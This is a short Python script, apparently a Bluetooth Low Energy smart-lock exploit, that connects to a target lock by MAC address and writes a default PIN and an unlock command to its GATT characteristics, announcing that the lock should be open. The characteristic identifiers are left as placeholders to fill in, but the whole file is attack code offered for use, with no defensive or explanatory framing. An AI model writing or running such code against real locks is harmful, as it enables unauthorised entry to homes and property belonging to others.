import asyncio
from bleak import BleakClient

# Color codes for terminal output
G = "\033[32m"
Y = "\033[33m"
R = "\033[31m"
RES = "\033[0m"

# Default target MAC address
target_mac = input("Enter Target Lock MAC address [Default: 11:22:33:44:55:66]: ").strip()
if not target_mac:
    target_mac = "11:22:33:44:55:66"

# GATT Characteristics UUIDs or handles (replace with actual UUIDs if available)
PASSCODE_CHAR_HANDLE = "0000xxxx-0000-1000-8000-00805f9b34fb"  # Replace with actual UUID
UNLOCK_CHAR_HANDLE = "0000yyyy-0000-1000-8000-00805f9b34fb"    # Replace with actual UUID

# Values to write
passcode_value = bytearray(b"0000")  # default PIN code
unlock_value = bytearray([0x01])     # unlock command

async def exploit_ble_lock(mac):
    try:
        print(f"{Y}[-]{RES} Connecting to device {mac} ...")
        async with BleakClient(mac) as client:
            if await client.is_connected():
                print(f"{G}[+]{RES} Connected to {mac}")

                print(f"{Y}[-]{RES} Sending PIN code...")
                await client.write_gatt_char(PASSCODE_CHAR_HANDLE, passcode_value, response=True)
                print(f"{G}[+]{RES} PIN code written to {PASSCODE_CHAR_HANDLE}")

                print(f"{Y}[-]{RES} Sending Unlock command...")
                await client.write_gatt_char(UNLOCK_CHAR_HANDLE, unlock_value, response=True)
                print(f"{G}[+]{RES} Unlock command written to {UNLOCK_CHAR_HANDLE}")

                print(f"{G}[+]{RES} Lock should now be open!")

            else:
                print(f"{R}[!] Failed to connect to {mac}")
    except Exception as e:
        print(f"{R}[!] Error: {e}")

# Run the exploit
asyncio.run(exploit_ble_lock(target_mac))
